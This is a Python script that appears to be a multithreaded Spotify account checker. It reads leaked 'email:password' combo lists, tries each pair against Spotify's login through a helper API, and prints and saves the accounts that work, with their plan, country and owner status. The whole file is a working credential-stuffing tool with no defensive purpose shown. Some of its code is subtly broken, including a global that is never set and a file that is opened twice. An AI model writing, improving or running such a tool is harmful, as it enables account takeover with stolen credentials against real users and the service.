# Imports
from api import API
from multiprocessing import Pool, RLock
import click

# Globals
lock = RLock()
SpotifyAPI = API()
output_name = None

def check(line):
    # Get token
    token = SpotifyAPI.get_csrf_token()

    # Split the line
    line = line.replace('\n', '')
    credentials = line.split(':')

    # Login
    response = SpotifyAPI.login(token, credentials[0], credentials[1])

    # Check answer
    if (response['status']):
        # Get account details
        d = SpotifyAPI.get_account_details(response['session'])

        # Print details
        with lock:
            click.echo(
                ("[✔︎] %s"
                 " | Plan: %s"
                 " | Country: %s"
                 " | Is owner ? %s\n")
                %
                (line,
                 d['plan'],
                 d['country'],
                 d['is_owner'])
            )

            # Append to file
            if (output_name != None):
                    with open(output_name, "a") as file:
                        file.write("%s | Plan: %s | Country: %s | Owner: %s\n" % (
                            line, d['plan'], d['country'], d['is_owner']))
    else:
        with lock:
            click.echo('[✕] %s\n' % line)


@click.command()
@click.argument('input', required=True, type=click.File())
@click.option('--threads', type=click.INT, default=4, help='Number of threads for the task (default: 4)')
@click.option('--output', type=click.STRING, help='Output file (e.g.: output.txt)', default=None)
def cli(input, threads, output):
    # Starting
    click.echo("[*] Starting with %s threads ..." % threads)
    pool = Pool(threads)

    # Store output
    output_name = output

    # Read file
    with open(input, 'r') as file:
        try:
            # Send into the pool
            pool.map(check, file, 1)
        except KeyboardInterrupt:
            # Stop pool
            click.echo("[!] SIGINT received, stopping ...")
            pool.terminate()
    
    # Close pool
    pool.close()

    # Join pool
    pool.join()

if __name__ == "__main__":
    cli()
